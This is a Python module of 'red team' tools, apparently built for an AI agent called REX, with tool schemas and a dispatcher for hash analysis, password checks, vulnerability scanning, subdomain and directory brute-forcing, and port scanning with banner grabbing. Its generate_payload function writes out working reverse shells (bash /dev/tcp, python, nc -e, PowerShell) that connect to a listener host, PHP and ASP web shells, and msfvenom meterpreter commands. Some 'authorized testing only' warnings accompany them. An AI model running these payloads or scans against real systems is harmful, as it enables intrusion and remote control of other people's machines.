"""
Red Team Tools for REX
Provides security testing, vulnerability assessment, and penetration testing utilities.
FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import json
import hashlib
import subprocess
import socket
import re
from pathlib import Path
from typing import Optional
from datetime import datetime
import time

import requests
from core.error_handler import log_error


def hash_crack_check(hash_value: str) -> str:
    """
    Check if a hash has been cracked (uses public hash databases).
    """
    output = f"🔐 Hash Analysis: {hash_value[:50]}...\n"
    output += "=" * 50 + "\n\n"
    
    # Identify hash type
    hash_type = identify_hash_type(hash_value)
    output += f"🔍 Detected Hash Type: {hash_type}\n\n"
    
    # Check hash length hints
    length = len(hash_value)
    output += f"📏 Hash Length: {length} characters\n\n"
    
    # Common hash type mappings by length
    hash_lengths = {
        32: "MD5",
        40: "SHA-1",
        56: "SHA-224",
        64: "SHA-256",
        96: "SHA-384",
        128: "SHA-512",
    }
    
    if length in hash_lengths:
        output += f"📊 Likely Type: {hash_lengths[length]}\n\n"
    
    # Check if it's a common weak hash
    weak_hashes = {
        "5d41402abc4b2a76b9719d911017c592": "hello",
        "e99a18c428cb38d5f260853678922e03": "abc123",
        "098f6bcd4621d373cade4e832627b4f6": "test",
        "5f4dcc3b5aa765d61d8327deb882cf99": "password",
    }
    
    if hash_value.lower() in weak_hashes:
        output += f"⚠️ WARNING: This is a known weak hash!\n"
        output += f"🔓 Plaintext: {weak_hashes[hash_value.lower()]}\n\n"
    
    # Try online lookup (limited to avoid rate limiting)
    output += "💡 To crack this hash, try:\n"
    output += "• crackstation.net\n"
    output += "• hashes.com\n"
    output += "• hashcat with appropriate rules\n"
    output += "• john the ripper\n\n"
    
    # Format-specific tips
    if hash_type == "MD5":
        output += "📝 MD5 is fast to crack - use rockyou.txt wordlist\n"
    elif hash_type == "SHA-1":
        output += "📝 SHA-1 is deprecated - still crackable with GPU\n"
    elif hash_type == "bcrypt":
        output += "📝 bcrypt is slow by design - may take significant time\n"
    
    return output


def identify_hash_type(hash_value: str) -> str:
    """Identify hash type based on format."""
    if re.match(r'^[a-fA-F0-9]{32}$', hash_value):
        return "MD5"
    elif re.match(r'^[a-fA-F0-9]{40}$', hash_value):
        return "SHA-1"
    elif re.match(r'^[a-fA-F0-9]{64}$', hash_value):
        return "SHA-256"
    elif re.match(r'^\$2[aby]?\$\d{2}\$.{53}$', hash_value):
        return "bcrypt"
    elif re.match(r'^[a-fA-F0-9]{128}$', hash_value):
        return "SHA-512"
    else:
        return "Unknown"


def password_strength_check(password: str) -> str:
    """
    Analyze password strength and estimate crack time.
    """
    output = f"🔐 Password Strength Analysis\n"
    output += "=" * 50 + "\n\n"
    
    # Basic analysis
    length = len(password)
    has_upper = bool(re.search(r'[A-Z]', password))
    has_lower = bool(re.search(r'[a-z]', password))
    has_digit = bool(re.search(r'\d', password))
    has_special = bool(re.search(r'[!@#$%^&*(),.?\":{}|<>]', password))
    
    # Calculate entropy
    charset_size = 0
    if has_lower: charset_size += 26
    if has_upper: charset_size += 26
    if has_digit: charset_size += 10
    if has_special: charset_size += 32
    if charset_size == 0: charset_size = 26
    
    import math
    entropy = length * math.log2(charset_size) if charset_size > 0 else 0
    
    # Strength rating
    if entropy < 28:
        strength = "🔴 VERY WEAK"
        crack_time = "Instantly"
    elif entropy < 36:
        strength = "🟠 WEAK"
        crack_time = "Minutes to hours"
    elif entropy < 60:
        strength = "🟡 MODERATE"
        crack_time = "Days to months"
    elif entropy < 80:
        strength = "🟢 STRONG"
        crack_time = "Years"
    else:
        strength = "🟢 VERY STRONG"
        crack_time = "Centuries"
    
    output += f"💪 Strength: {strength}\n"
    output += f"📊 Entropy: {entropy:.1f} bits\n"
    output += f"⏱️ Estimated Crack Time: {crack_time}\n\n"
    
    output += f"📝 Character Analysis:\n"
    output += f"   • Length: {length} characters\n"
    output += f"   • Uppercase: {'✅' if has_upper else '❌'}\n"
    output += f"   • Lowercase: {'✅' if has_lower else '❌'}\n"
    output += f"   • Numbers: {'✅' if has_digit else '❌'}\n"
    output += f"   • Special: {'✅' if has_special else '❌'}\n\n"
    
    # Common patterns check
    patterns = []
    if re.search(r'(.)\1{2,}', password):
        patterns.append("Repeated characters")
    if re.search(r'(012|123|234|345|456|567|678|789|890)', password):
        patterns.append("Sequential numbers")
    if re.search(r'(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz)', password.lower()):
        patterns.append("Sequential letters")
    if re.search(r'(password|123456|qwerty|admin|letmein|welcome|monkey|dragon)', password.lower()):
        patterns.append("Common password")
    
    if patterns:
        output += f"⚠️ Weaknesses Found:\n"
        for p in patterns:
            output += f"   • {p}\n"
    else:
        output += f"✅ No obvious patterns detected\n"
    
    # Recommendations
    output += f"\n💡 Recommendations:\n"
    if length < 12:
        output += f"   • Use at least 12 characters\n"
    if not has_upper or not has_lower:
        output += f"   • Mix uppercase and lowercase\n"
    if not has_digit:
        output += f"   • Add numbers\n"
    if not has_special:
        output += f"   • Add special characters\n"
    
    return output


def vulnerability_scan(target: str) -> str:
    """
    Basic vulnerability scan (checks common misconfigurations).
    """
    output = f"🛡️ Vulnerability Assessment: {target}\n"
    output += "=" * 50 + "\n\n"
    
    findings = []
    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    
    # Check HTTP methods
    try:
        resp = requests.options(f"http://{target}", timeout=5)
        allowed_methods = resp.headers.get("Allow", "")
        if "PUT" in allowed_methods or "DELETE" in allowed_methods:
            findings.append({
                "severity": "medium",
                "title": "Dangerous HTTP Methods Enabled",
                "detail": f"Allowed methods: {allowed_methods}"
            })
            severity_counts["medium"] += 1
    except Exception as _e:

        log_error(_e, context="actions.redteam_tools", severity="warning")
    
    # Check for security headers
    try:
        resp = requests.head(f"https://{target}", timeout=5)
        headers = resp.headers
        
        missing_headers = []
        security_headers = {
            "Strict-Transport-Security": "HSTS",
            "X-Content-Type-Options": "Content Type Options",
            "X-Frame-Options": "Frame Options",
            "Content-Security-Policy": "CSP",
            "X-XSS-Protection": "XSS Protection",
        }
        
        for header, name in security_headers.items():
            if header not in headers:
                missing_headers.append(name)
        
        if missing_headers:
            findings.append({
                "severity": "low",
                "title": "Missing Security Headers",
                "detail": f"Missing: {', '.join(missing_headers)}"
            })
            severity_counts["low"] += 1
    except Exception as _e:

        log_error(_e, context="actions.redteam_tools", severity="warning")
    
    # Check for exposed files
    common_files = [
        "/.git/config", "/.env", "/wp-config.php", "/config.php",
        "/robots.txt", "/sitemap.xml", "/.htaccess", "/server-status"
    ]
    
    exposed_files = []
    for file in common_files:
        try:
            resp = requests.get(f"http://{target}{file}", timeout=3)
            if resp.status_code == 200 and len(resp.text) > 10:
                exposed_files.append(file)
        except Exception as _e:

            log_error(_e, context="actions.redteam_tools", severity="warning")
    
    if exposed_files:
        findings.append({
            "severity": "high",
            "title": "Exposed Sensitive Files",
            "detail": f"Found: {', '.join(exposed_files)}"
        })
        severity_counts["high"] += 1
    
    # Check SSL/TLS
    try:
        import ssl
        context = ssl.create_default_context()
        with socket.create_connection((target, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                from datetime import datetime
                not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                days_left = (not_after - datetime.now()).days
                
                if days_left < 30:
                    findings.append({
                        "severity": "high",
                        "title": "SSL Certificate Expiring Soon",
                        "detail": f"Expires in {days_left} days"
                    })
                    severity_counts["high"] += 1
    except Exception as _e:

        log_error(_e, context="actions.redteam_tools", severity="warning")
    
    # Format output
    if findings:
        output += f"🔍 Found {len(findings)} issues:\n\n"
        
        for finding in sorted(findings, key=lambda x: 
            {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}[x["severity"]]):
            
            severity_icon = {
                "critical": "🔴",
                "high": "🟠",
                "medium": "🟡",
                "low": "🔵",
                "info": "ℹ️"
            }.get(finding["severity"], "❓")
            
            output += f"{severity_icon} [{finding['severity'].upper()}] {finding['title']}\n"
            output += f"   {finding['detail']}\n\n"
        
        output += f"\n📊 Summary:\n"
        output += f"   • Critical: {severity_counts['critical']}\n"
        output += f"   • High: {severity_counts['high']}\n"
        output += f"   • Medium: {severity_counts['medium']}\n"
        output += f"   • Low: {severity_counts['low']}\n"
    else:
        output += "✅ No obvious vulnerabilities found\n"
        output += "   (This is a basic scan - use专业 tools for comprehensive testing)\n"
    
    return output


def subdomain_enum(domain: str) -> str:
    """
    Enumerate subdomains using common wordlist.
    """
    output = f"🔍 Subdomain Enumeration: {domain}\n"
    output += "=" * 50 + "\n\n"
    
    # Common subdomains wordlist
    subdomains = [
        "www", "mail", "ftp", "admin", "api", "dev", "staging", "test",
        "blog", "shop", "store", "app", "portal", "vpn", "remote",
        "webmail", "smtp", "pop", "imap", "ns1", "ns2", "dns", "mx",
        "cdn", "media", "static", "assets", "images", "img",
        "docs", "wiki", "help", "support", "kb", "forum",
        "db", "database", "sql", "mysql", "postgres", "mongo", "redis",
        "git", "gitlab", "jenkins", "ci", "cd", "deploy", "build",
        "monitor", "grafana", "kibana", "elastic", "splunk",
        "auth", "sso", "login", "accounts", "oauth",
        "backup", "old", "legacy", "archive", "temp", "tmp",
    ]
    
    found = []
    checked = 0
    
    for sub in subdomains:
        fqdn = f"{sub}.{domain}"
        try:
            socket.getaddrinfo(fqdn, None)
            found.append(fqdn)
            output += f"✅ {fqdn}\n"
        except socket.gaierror as _e:
            log_error(_e, context="redteam_tools.subdomain_enum", severity="warning")
        checked += 1
    
    if found:
        output += f"\n📊 Found {len(found)} subdomains out of {checked} checked\n"
    else:
        output += f"\n⚠️ No subdomains found (checked {checked} possibilities)\n"
    
    output += "\n💡 For comprehensive enumeration, use tools like:\n"
    output += "• subfinder\n"
    output += "• amass\n"
    output += "• sublist3r\n"
    output += "• dnsrecon\n"
    
    return output


def directory_bruteforce(url: str, wordlist: str = "common") -> str:
    """
    Discover hidden directories and files on web servers.
    """
    output = f"📁 Directory Discovery: {url}\n"
    output += "=" * 50 + "\n\n"
    
    # Common directories wordlist
    common_dirs = [
        "admin", "administrator", "login", "wp-admin", "wp-login.php",
        "phpmyadmin", "cpanel", "webmail", "mail", "smtp",
        "api", "api/v1", "api/v2", "graphql", "swagger", "docs",
        "backup", "backups", "old", "temp", "tmp", "test", "dev",
        "config", "configuration", "settings", "setup", "install",
        "robots.txt", "sitemap.xml", ".env", ".git", ".svn",
        "server-status", "server-info", "phpinfo.php", "info.php",
        ".htaccess", ".htpasswd", "web.config", "crossdomain.xml",
        "readme", "README", "CHANGELOG", "LICENSE", "TODO",
        "db", "database", "sql", "dump", "export",
        "uploads", "upload", "files", "media", "images", "static",
        "assets", "css", "js", "javascript", "scripts",
        "cgi-bin", "scripts", "bin", "includes", "lib",
    ]
    
    found = []
    
    for directory in common_dirs:
        try:
            full_url = f"{url.rstrip('/')}/{directory}"
            resp = requests.get(full_url, timeout=3, allow_redirects=False)
            
            if resp.status_code in [200, 301, 302, 403]:
                status_text = {
                    200: "OK",
                    301: "Moved",
                    302: "Redirect",
                    403: "Forbidden"
                }.get(resp.status_code, str(resp.status_code))
                
                output += f"✅ /{directory} [{resp.status_code} {status_text}]\n"
                found.append((directory, resp.status_code))
        except Exception as _e:

            log_error(_e, context="actions.redteam_tools", severity="warning")
    
    if found:
        output += f"\n📊 Found {len(found)} paths\n"
    else:
        output += "\n⚠️ No common paths found\n"
    
    output += "\n💡 For comprehensive scanning, use:\n"
    output += "• dirb\n"
    output += "• dirsearch\n"
    output += "• gobuster\n"
    output += "• ffuf\n"
    
    return output


def network_enumeration(target: str) -> str:
    """
    Basic network enumeration (OS detection, open ports, services).
    """
    output = f"🖥️ Network Enumeration: {target}\n"
    output += "=" * 50 + "\n\n"
    
    # Try to resolve hostname
    try:
        ip = socket.gethostbyname(target)
        output += f"📡 Resolved IP: {ip}\n\n"
    except Exception:
        ip = target
    
    # Check common ports and identify services
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
        995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
    }
    
    open_services = []
    
    output += "🔍 Scanning common ports...\n\n"
    
    for port, service in common_ports.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                output += f"✅ Port {port}: {service} OPEN\n"
                open_services.append((port, service))
                
                # Try to grab banner
                try:
                    sock.settimeout(1)
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode(errors='ignore').strip()
                    if banner:
                        output += f"   Banner: {banner[:100]}\n"
                except Exception as _e:

                    log_error(_e, context="actions.redteam_tools", severity="warning")
            sock.close()
        except Exception as _e:

            log_error(_e, context="actions.redteam_tools", severity="warning")
    
    if open_services:
        output += f"\n📊 Summary: {len(open_services)} open services\n"
        
        # Security assessment
        risky_services = []
        for port, service in open_services:
            if service in ["FTP", "Telnet", "HTTP", "NetBIOS", "SMB"]:
                risky_services.append(service)
        
        if risky_services:
            output += f"\n⚠️ Potentially risky services: {', '.join(risky_services)}\n"
    else:
        output += "\n⚠️ No open ports found\n"
    
    return output


def generate_payload(payload_type: str, lhost: str, lport: int) -> str:
    """
    Generate common payloads for authorized penetration testing.
    """
    output = f"💉 Payload Generator\n"
    output += "=" * 50 + "\n\n"
    
    payloads = {
        "reverse_shell": {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
        },
        "web_shells": {
            "php": f"<?php echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>'; ?>",
            "asp": f"<% response.write(server.createobject(\"wscript.shell\").exec(\"cmd /c \" & request(\"cmd\")).stdout.readall) %>",
        },
        "meterpreter": {
            "reverse_tcp": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
            "reverse_http": f"msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        }
    }
    
    if payload_type in payloads:
        output += f"🎯 {payload_type.upper()} Payloads:\n\n"
        for name, payload in payloads[payload_type].items():
            output += f"📝 {name}:\n{payload}\n\n"
    else:
        output += f"❌ Unknown payload type: {payload_type}\n"
        output += f"Available types: {', '.join(payloads.keys())}\n"
    
    output += "\n⚠️ FOR AUTHORIZED TESTING ONLY\n"
    output += "Always get written permission before testing.\n"
    
    return output


def generate_wordlist(topic: str, length: int = 8) -> str:
    """
    Generate custom wordlists for password cracking or fuzzing.
    """
    output = f"📝 Wordlist Generator: {topic}\n"
    output += "=" * 50 + "\n\n"
    
    # Basic character sets
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    digits = "0123456789"
    special = "!@#$%^&*"
    
    # Common patterns based on topic
    patterns = {
        "names": ["admin", "root", "user", "test", "guest", "info", "master", "support"],
        "years": ["2024", "2025", "2026", "1234", "0000", "1111"],
        "common": ["password", "123456", "qwerty", "letmein", "welcome", "monkey", "dragon"],
        "keyboard": ["qwerty", "asdfgh", "zxcvbn", "123456", "abcdef"],
    }
    
    output += "💡 Wordlist generation tips:\n\n"
    output += "For names topic:\n"
    output += f"  • Use common names: {', '.join(patterns['names'][:5])}\n"
    output += "  • Add years: name2024, name2025\n"
    output += "  • Add special: name!, name@123\n\n"
    
    output += "For common passwords:\n"
    output += f"  • Start with: {', '.join(patterns['common'][:5])}\n"
    output += "  • Add leetspeak: p@ssw0rd, l3tm31n\n"
    output += "  • Add patterns: Password1!, Qwerty123!\n\n"
    
    output += "🎯 Recommended tools:\n"
    output += "• crunch - Generate custom wordlists\n"
    output += "• cupp - Common User Passwords Profiler\n"
    output += "• mentalist - Graphical wordlist generator\n"
    output += "• hashcat rules - Transform base words\n"
    
    # Generate sample entries
    output += f"\n📋 Sample entries for '{topic}':\n"
    samples = []
    for name in patterns.get("names", ["admin"])[:3]:
        samples.append(name)
        samples.append(f"{name}123")
        samples.append(f"{name}!")
        samples.append(f"{name}2024")
    
    for sample in samples[:10]:
        output += f"  • {sample}\n"
    
    return output


# Tool definitions for registration
REDTEAM_TOOLS = [
    {
        "name": "red_hash_analyze",
        "description": (
            "Analyzes hash values to identify type and check against known cracked hashes. "
            "Use for password recovery and forensic analysis."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "hash_value": {"type": "STRING", "description": "Hash to analyze"}
            },
            "required": ["hash_value"]
        }
    },
    {
        "name": "red_password_check",
        "description": (
            "Analyzes password strength, entropy, and patterns. "
            "Use to evaluate password security."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "password": {"type": "STRING", "description": "Password to analyze"}
            },
            "required": ["password"]
        }
    },
    {
        "name": "red_vuln_scan",
        "description": (
            "Performs basic vulnerability scan checking for common misconfigurations, "
            "missing security headers, exposed files, and SSL issues."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "target": {"type": "STRING", "description": "Target domain or IP"}
            },
            "required": ["target"]
        }
    },
    {
        "name": "red_subdomain_enum",
        "description": (
            "Enumerates subdomains using common wordlist. "
            "Use for reconnaissance and attack surface mapping."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "domain": {"type": "STRING", "description": "Target domain"}
            },
            "required": ["domain"]
        }
    },
    {
        "name": "red_dir_bruteforce",
        "description": (
            "Discovers hidden directories and files on web servers. "
            "Use for finding admin panels, backups, and sensitive files."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "url": {"type": "STRING", "description": "Target URL (e.g., http://example.com)"},
                "wordlist": {"type": "STRING", "description": "Wordlist type: common, large, small"}
            },
            "required": ["url"]
        }
    },
    {
        "name": "red_network_enum",
        "description": (
            "Performs network enumeration: OS detection, open ports, service identification, "
            "and banner grabbing."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "target": {"type": "STRING", "description": "Target IP or hostname"}
            },
            "required": ["target"]
        }
    },
    {
        "name": "red_generate_payload",
        "description": (
            "Generates common payloads for penetration testing: reverse shells, "
            "web shells, meterpreter. FOR AUTHORIZED TESTING ONLY."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "payload_type": {"type": "STRING", "description": "Type: reverse_shell, web_shells, meterpreter"},
                "lhost": {"type": "STRING", "description": "Listener IP address"},
                "lport": {"type": "INTEGER", "description": "Listener port"}
            },
            "required": ["payload_type", "lhost", "lport"]
        }
    },
    {
        "name": "red_wordlist_gen",
        "description": (
            "Generates custom wordlists for password cracking or fuzzing. "
            "Use for creating targeted attack wordlists."
        ),
        "parameters": {
            "type": "OBJECT",
            "properties": {
                "topic": {"type": "STRING", "description": "Wordlist theme: names, years, common, keyboard"},
                "length": {"type": "INTEGER", "description": "Max password length (default: 8)"}
            },
            "required": ["topic"]
        }
    },
]


def handle_redteam_tool(tool_name: str, parameters: dict, speak=None) -> str:
    """Route red team tool calls to appropriate functions."""
    try:
        if tool_name == "red_hash_analyze":
            return hash_crack_check(parameters.get("hash_value", ""))
        elif tool_name == "red_password_check":
            return password_strength_check(parameters.get("password", ""))
        elif tool_name == "red_vuln_scan":
            return vulnerability_scan(parameters.get("target", ""))
        elif tool_name == "red_subdomain_enum":
            return subdomain_enum(parameters.get("domain", ""))
        elif tool_name == "red_dir_bruteforce":
            return directory_bruteforce(
                parameters.get("url", ""),
                parameters.get("wordlist", "common")
            )
        elif tool_name == "red_network_enum":
            return network_enumeration(parameters.get("target", ""))
        elif tool_name == "red_generate_payload":
            return generate_payload(
                parameters.get("payload_type", ""),
                parameters.get("lhost", ""),
                parameters.get("lport", 4444)
            )
        elif tool_name == "red_wordlist_gen":
            return generate_wordlist(
                parameters.get("topic", ""),
                parameters.get("length", 8)
            )
        else:
            return f"❌ Unknown red team tool: {tool_name}"
    except Exception as e:
        return f"❌ Red team tool error: {e}"
